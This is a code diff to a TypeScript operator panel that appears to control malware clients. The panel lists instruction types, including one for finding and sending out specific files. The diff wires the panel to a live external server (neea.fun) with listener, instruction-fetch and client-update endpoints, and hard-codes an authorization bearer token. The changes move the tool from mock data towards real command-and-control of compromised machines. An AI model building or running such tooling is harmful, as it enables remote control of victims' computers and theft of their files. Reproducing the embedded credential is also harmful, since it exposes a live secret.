@@ -30,6 +30,11 @@ const INSTRUCTION_DESCRIPTIONS: Record<string, string> = {
   "file_exfiltration": "Söker och skickar specifika filer"
 };
 
+// Production server URL - Updated to match the Apache configuration
+const SERVER_BASE_URL = 'https://neea.fun';
+const API_ENDPOINT = '/listener/log_receiver';
+const INSTRUCTIONS_ENDPOINT = '/get_instructions';
+
 // Mock client data - this will be replaced by real API data in production
 const MOCK_CLIENTS: ClientInstruction[] = [
   {
@@ -53,7 +58,7 @@ export async function extractScriptsFromInstructionsPy(): Promise<ScriptsData> {
   // In a real app, this would parse the Python file server-side
   // For now, we're returning the actual instruction code from instructions.py
   try {
-    console.log("Mock import of instructions.py");
+    console.log("Importing instructions from instructions.py");
     
     // Return the actual instruction code
     return INSTRUCTION_CODE;
@@ -76,7 +81,8 @@ export async function extractScriptsFromInstructionsPy(): Promise<ScriptsData> {
  */
 export async function getScripts(): Promise<ScriptsData> {
   try {
-    const response = await fetch('/api/scripts');
+    // Use the correct API endpoint based on the Apache configuration
+    const response = await fetch(`${SERVER_BASE_URL}${INSTRUCTIONS_ENDPOINT}`);
     
     if (!response.ok) {
       throw new Error(`Failed to fetch scripts: ${response.status} ${response.statusText}`);
@@ -113,7 +119,8 @@ export async function getInstructionTypes(): Promise<InstructionType[]> {
 // Get all clients and their current instructions
 export async function getClients(): Promise<ClientInstruction[]> {
   try {
-    const response = await fetch('/api/clients');
+    // Use the correct API endpoint based on the Apache configuration
+    const response = await fetch(`${SERVER_BASE_URL}/api/clients`);
     if (!response.ok) {
       throw new Error(`HTTP error! status: ${response.status}`);
     }
@@ -128,10 +135,12 @@ export async function getClients(): Promise<ClientInstruction[]> {
 // Update a client's instruction
 export async function updateClientInstruction(clientId: string, instructionId: string): Promise<boolean> {
   try {
-    const response = await fetch(`/api/clients/${clientId}/instruction`, {
+    // Use the correct API endpoint based on the Apache configuration
+    const response = await fetch(`${SERVER_BASE_URL}/api/clients/${clientId}/instruction`, {
       method: 'PUT',
       headers: {
         'Content-Type': 'application/json',
+        'Authorization': 'Bearer SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==', // Using the token from instructions.py
       },
       body: JSON.stringify({ instruction: instructionId }),
     });
